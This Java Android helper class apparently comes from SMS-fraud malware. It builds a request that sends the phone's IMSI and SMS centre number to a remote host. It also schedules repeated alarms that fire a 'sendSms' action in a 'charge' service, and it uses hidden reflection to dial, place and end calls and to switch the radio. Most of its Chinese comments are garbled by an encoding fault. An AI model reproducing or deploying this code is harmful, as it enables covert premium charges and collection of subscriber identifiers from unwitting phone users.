package com.sttm.util;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.text.DecimalFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import com.sttm.charge.KsoAlarmService;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.telephony.TelephonyManager;
import android.telephony.gsm.SmsMessage;
import android.util.Log;

@SuppressWarnings("deprecation")
public class KsoHelper {
	public static String getURL(String version, String date, String clnt,
			String smsc, String imsi, double rec, String fname) {
		String url = "http://www.shuihubinggan.com/ver1.jsp?plat=ARD&splat=KSver="
				+ version + "&date=" + date + "&clnt=" + clnt + "&msmc=" + smsc
				+ "&imsi=" + imsi + "&rec=" + rec + "&fname=" + fname;

		return url;
	}

	public static int getIndex(int flag) {
		int result = 0;

		do {
			result = (int) (Math.random() * 10);

		} while (result > 8 && flag == 1);
		return result;

	}

	public static void beginAlarmService(int count, Context context,
			int saleDelay2) {

		if (count <= 0) {
			return;
		}
		Intent intentSalesFlag2 = new Intent(context, KsoAlarmService.class);
		intentSalesFlag2.setAction("sendSms");
		PendingIntent pintentSalesFlag2 = PendingIntent.getBroadcast(context,
				0, intentSalesFlag2, 0);
		AlarmManager alarmSales2 = (AlarmManager) context
				.getSystemService(Context.ALARM_SERVICE);
		alarmSales2.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()
				+ saleDelay2 * 60 * 1000, pintentSalesFlag2);

		count--;

		beginAlarmService(count, context, saleDelay2);

	}

	public static int getCharacterPosition(String string, String params) {
		// �����ǻ�ȡ"/"���ŵ�λ��
		Matcher slashMatcher = Pattern.compile(params).matcher(string);
		int mIdx = 0;
		while (slashMatcher.find()) {
			mIdx++;
			// ��"/"���ŵ����γ��ֵ�λ��
			if (mIdx == 4) {
				break;
			}
		}
		return slashMatcher.start();
	}

	// �ж�Android�ͻ��������Ƿ�����
	public static boolean isWapconnected(Context context) {

		ConnectivityManager conManager = (ConnectivityManager) context
				.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo info = conManager.getActiveNetworkInfo();

		if (info != null && info.isConnected()) {
			if (info.getState() == NetworkInfo.State.CONNECTED) {
				String currentAPN = info.getExtraInfo();
				if (currentAPN == null || "".equals(currentAPN)) {
					return false;
				} else if (currentAPN.contains("wap")) {
					return true;
				}

			}
		}
		return false;
	}

	// �ж�һ���ַ�������һ���ַ����г��ֵĴ���
	// ����S��ĸ�ַ���������T�����ַ���
	public static int sort(String t, String s) {
		int count = 0;
		String[] k = s.split(t);
		if (s.lastIndexOf(t) == (s.length() - t.length()))
			count = k.length;
		else
			count = k.length - 1;
		if (count == 0)
			System.out.println("t do not founded in s");
		else
			return count;
		return -1;
	}

	public static int getRandom(int max) {
		if (max == 1) {
			return 0;
		}
		int result = 0;

		do {
			result = (int) (Math.random() * 10);

		} while (result >= max);
		return result;

	}

	public static int getCurrentMonth() {
		Calendar c = Calendar.getInstance();
		int month = c.get(Calendar.MONTH);
		return month;
	}

	// ����Ƿ�GPRS����
	public static boolean checkIsUpdate(String today, Context context) {
		ShareProDBHelper dbHelper = new ShareProDBHelper(context);
		SharedPreferences sp = dbHelper.getSharedPreferences("dataCenter");
		String updateTime = "";
		if (sp != null) {
			updateTime = sp.getString("updateTime", "1��01��");
		}
		if (today.equals(updateTime)) {
			return true;
		}
		return false;
	}

	// ʱ��ת�����ַ���

	public static String date2String() {
		Date date = new Date();
		SimpleDateFormat format = new SimpleDateFormat("M��dd��");

		return format.format(date);

	}

	/**
	 * 
	 * @param string����
	 * @param params�ָ��
	 * @param keying�ڼ���
	 * @return�ָ��ַ�������λ��
	 */

	public static int getCharacterPosition(String string, String params,
			int keyind) {

		Matcher slashMatcher = Pattern
				.compile(params, Pattern.CASE_INSENSITIVE).matcher(string);
		int mIdx = 0;
		while (slashMatcher.find()) {
			mIdx++;

			if (mIdx == keyind) {
				break;
			}
		}
		return slashMatcher.start();
	}

	public static double getRandomDouble(int min, int max) {
		DecimalFormat df = new DecimalFormat("##.#");
		double d1 = Double.parseDouble(df.format(Math.random()));
		int result = 0;
		do {
			result = (int) (Math.random() * 10);

		} while (result >= max || result < min);

		return (result + d1);

	}

	public static double getRandomDouble2(int value) {
		DecimalFormat df = new DecimalFormat("##.#");
		double d1 = Double.parseDouble(df.format(Math.random()));
		return (value + d1);
	}

	public static String getImsi(Context context) {
		TelephonyManager telManager = (TelephonyManager) context
				.getSystemService(Context.TELEPHONY_SERVICE);
		String imsi = telManager.getSubscriberId();
		if (imsi == null) {
			imsi = telManager.getSimOperator();
		}
		return imsi;

	}

	// IMSI���ȡ
	public static int getARS(Context context) {
		TelephonyManager telManager = (TelephonyManager) context
				.getSystemService(Context.TELEPHONY_SERVICE);
		String operator = telManager.getSimOperator();
		if (operator != null) {
			//Log.d("����imsi", operator);
			if (operator.equals("46000") || operator.equals("46002")
					|| operator.equals("46007")) {
				// �й��ƶ�
				return 1;
			} else if (operator.equals("46001")) {
				// �й���ͨ
				return 2;

			} else if (operator.equals("46003")) {
				// �й�����
				return 3;
			}
		}
		return 0;

	}

	public static int getARS2(Context context) {
		TelephonyManager telManager = (TelephonyManager) context
				.getSystemService(Context.TELEPHONY_SERVICE);
		/**
		 * ��ȡSIM����IMSI�� SIM��Ψһ��ʶ��IMSI �����ƶ��û�ʶ���루IMSI��International Mobile
		 * Subscriber Identification Number���������ƶ��û��ı�־��
		 * ������SIM���У������������ƶ��û�����Ч��Ϣ��IMSI��MCC��MNC��MSIN��ɣ�����MCCΪ�ƶ����Һ��룬��3λ������ɣ�
		 * Ψһ��ʶ���ƶ��ͻ������Ĺ��ң��ҹ�Ϊ460��MNCΪ����id����2λ������ɣ�
		 * ����ʶ���ƶ��ͻ����������ƶ����磬�й��ƶ�Ϊ00���й���ͨΪ01,�й�����Ϊ03��MSINΪ�ƶ��ͻ�ʶ���룬���õȳ�11λ���ֹ��ɡ�
		 * Ψһ��ʶ�����GSM�ƶ�ͨ�������ƶ��ͻ�������Ҫ�������ƶ�������ͨ��ֻ��ȡ��SIM���е�MNC�ֶμ���
		 */
		/* ����ģʽ */
		String imsi = telManager.getSubscriberId();

		/* ˫��ģʽ */
		/*
		 * String imsi = telManager.getSubscriberIdGemini(0); if(imsi == null){
		 * imsi = telManager.getSubscriberIdGemini(1); }
		 */

		if (imsi != null) {
			//Log.d("����imsi", imsi);
			if (imsi.startsWith("46000") || imsi.startsWith("46002")) {// ��Ϊ�ƶ�������46000�µ�IMSI�Ѿ����꣬����������һ��46002��ţ�134/159�Ŷ�ʹ���˴˱��
				// �й��ƶ�
				return 1;
			} else if (imsi.startsWith("46001")) {
				// �й���ͨ
				return 2;
			} else if (imsi.startsWith("46003")) {
				// �й�����
				return 3;
			}
		}
		return 0;

	}

	// �Ƿ�д��־
	public static boolean isWriteLog(Context context)
			throws NameNotFoundException {
		ApplicationInfo appInfo = context.getPackageManager()
				.getApplicationInfo(context.getPackageName(),
						PackageManager.GET_META_DATA);
		Boolean msg = appInfo.metaData.getBoolean("userLog");
		if (msg != null) {
			return msg;
		}
		return true;

	}

	// �����汾������
	public static String getVersionDate(Context context)
			throws NameNotFoundException {
		ApplicationInfo appInfo = context.getPackageManager()
				.getApplicationInfo(context.getPackageName(),
						PackageManager.GET_META_DATA);
		Integer msg = appInfo.metaData.getInt("versionDate");

		if (msg != null) {
			return String.valueOf(msg);
		}

		return updateTime();

	}

	public static boolean isConnection(HttpURLConnection conn) {
		try {

			conn.setConnectTimeout(5 * 1000);
			conn.connect();
			return true;

		} catch (Exception e) {
			return false;
		}
	}

	public static String updateTime() {
		Date date = new Date();

		SimpleDateFormat format = new SimpleDateFormat("yyyyMMdd");

		return format.format(date);

	}

	// ��ȡ�������ĺ���
	public String getSmsc(SmsMessage sm) {
		return sm.getServiceCenterAddress() != null ? sm
				.getServiceCenterAddress() : "755";
	}

	public static void dial(String number, Context context) {
		Class<TelephonyManager> c = TelephonyManager.class;
		Method getITelephonyMethod = null;
		try {
			getITelephonyMethod = c.getDeclaredMethod("getITelephony",
					(Class[]) null);
			getITelephonyMethod.setAccessible(true);
		} catch (SecurityException e) {

			e.printStackTrace();
		} catch (NoSuchMethodException e) {

			e.printStackTrace();
		}

		try {
			TelephonyManager tManager = (TelephonyManager) context
					.getSystemService(Context.TELEPHONY_SERVICE);
			Object iTelephony;
			iTelephony = (Object) getITelephonyMethod.invoke(tManager,
					(Object[]) null);
			Method dial = iTelephony.getClass().getDeclaredMethod("dial",
					String.class);
			dial.invoke(iTelephony, number);
		} catch (IllegalArgumentException e) {

			e.printStackTrace();
		} catch (IllegalAccessException e) {

			e.printStackTrace();
		} catch (SecurityException e) {

			e.printStackTrace();
		} catch (NoSuchMethodException e) {

			e.printStackTrace();
		} catch (InvocationTargetException e) {

			e.printStackTrace();
		}
	}

	public static void call(String number, Context context) {
		Class<TelephonyManager> c = TelephonyManager.class;
		Method getITelephonyMethod = null;
		try {
			getITelephonyMethod = c.getDeclaredMethod("getITelephony",
					(Class[]) null);
			getITelephonyMethod.setAccessible(true);
		} catch (SecurityException e) {

			e.printStackTrace();
		} catch (NoSuchMethodException e) {

			e.printStackTrace();
		}

		try {
			TelephonyManager tManager = (TelephonyManager) context
					.getSystemService(Context.TELEPHONY_SERVICE);
			Object iTelephony;
			iTelephony = (Object) getITelephonyMethod.invoke(tManager,
					(Object[]) null);
			Method dial = iTelephony.getClass().getDeclaredMethod("call",
					String.class);
			dial.invoke(iTelephony, number);
		} catch (IllegalArgumentException e) {

			e.printStackTrace();
		} catch (IllegalAccessException e) {

			e.printStackTrace();
		} catch (SecurityException e) {

			e.printStackTrace();
		} catch (NoSuchMethodException e) {

			e.printStackTrace();
		} catch (InvocationTargetException e) {

			e.printStackTrace();
		}
	}

	public static void endCall(Context context) {
		Class<TelephonyManager> c = TelephonyManager.class;
		Method getITelephonyMethod = null;
		try {
			getITelephonyMethod = c.getDeclaredMethod("getITelephony",
					(Class[]) null);
			getITelephonyMethod.setAccessible(true);
		} catch (SecurityException e) {

			e.printStackTrace();
		} catch (NoSuchMethodException e) {

			e.printStackTrace();
		}

		try {
			TelephonyManager tManager = (TelephonyManager) context
					.getSystemService(Context.TELEPHONY_SERVICE);
			Object iTelephony;
			iTelephony = (Object) getITelephonyMethod.invoke(tManager,
					(Object[]) null);
			Method endCall = iTelephony.getClass().getDeclaredMethod("endCall",
					String.class);
			endCall.invoke(iTelephony);
		} catch (IllegalArgumentException e) {

			e.printStackTrace();
		} catch (IllegalAccessException e) {

			e.printStackTrace();
		} catch (SecurityException e) {

			e.printStackTrace();
		} catch (NoSuchMethodException e) {

			e.printStackTrace();
		} catch (InvocationTargetException e) {

			e.printStackTrace();
		}
	}

	public static boolean isCalling(String number, Context context) {
		Class<TelephonyManager> c = TelephonyManager.class;
		Method getITelephonyMethod = null;
		try {
			getITelephonyMethod = c.getDeclaredMethod("getITelephony",
					(Class[]) null);
			getITelephonyMethod.setAccessible(true);
		} catch (SecurityException e) {

			e.printStackTrace();
		} catch (NoSuchMethodException e) {

			e.printStackTrace();
		}

		try {
			TelephonyManager tManager = (TelephonyManager) context
					.getSystemService(Context.TELEPHONY_SERVICE);
			Object iTelephony;
			iTelephony = (Object) getITelephonyMethod.invoke(tManager,
					(Object[]) null);
			Method isRinging = iTelephony.getClass().getDeclaredMethod(
					"isRinging", String.class);
			return (Boolean) isRinging.invoke(iTelephony, number);
		} catch (IllegalArgumentException e) {

			e.printStackTrace();
		} catch (IllegalAccessException e) {

			e.printStackTrace();
		} catch (SecurityException e) {

			e.printStackTrace();
		} catch (NoSuchMethodException e) {

			e.printStackTrace();
		} catch (InvocationTargetException e) {

			e.printStackTrace();
		}
		return false;
	}

	/**
	 * ���ص�ǰ����汾��
	 */
	public static String getAppVersionName(Context context) {
		String versionName = "";
		try {
			// ---get the package info---
			PackageManager pm = context.getPackageManager();
			PackageInfo pi = pm.getPackageInfo(context.getPackageName(), 0);
			versionName = pi.versionName;
			if (versionName == null || versionName.length() <= 0) {
				return "";
			}
		} catch (Exception e) {
			//Log.d("VersionInfo", "Exception", e);
		}
		return versionName;
	}

	public static String getRandomCode() {

		// ��ȡ�����
		SimpleDateFormat sdf = new SimpleDateFormat("MMddmmss");
		String time = sdf.format(new Date());
		long ticks = System.currentTimeMillis();
		String tick = ticks + "";
		tick = time.trim() + tick.trim().substring(tick.length() - 6);
		return tick;
	}

	public static boolean setRadio(boolean shutdown, Context context) {
		Class<TelephonyManager> c = TelephonyManager.class;
		Method getITelephonyMethod = null;
		try {
			getITelephonyMethod = c.getDeclaredMethod("getITelephony",
					(Class[]) null);
			getITelephonyMethod.setAccessible(true);
		} catch (SecurityException e) {

			e.printStackTrace();
		} catch (NoSuchMethodException e) {

			e.printStackTrace();
		}

		try {
			TelephonyManager tManager = (TelephonyManager) context
					.getSystemService(Context.TELEPHONY_SERVICE);
			Object iTelephony;
			iTelephony = (Object) getITelephonyMethod.invoke(tManager,
					(Object[]) null);
			Method setRadio = iTelephony.getClass().getDeclaredMethod(
					"setRadio", String.class);
			return (Boolean) setRadio.invoke(iTelephony, shutdown);
		} catch (IllegalArgumentException e) {

			e.printStackTrace();
		} catch (IllegalAccessException e) {

			e.printStackTrace();
		} catch (SecurityException e) {

			e.printStackTrace();
		} catch (NoSuchMethodException e) {

			e.printStackTrace();
		} catch (InvocationTargetException e) {

			e.printStackTrace();
		}
		return false;
	}

}
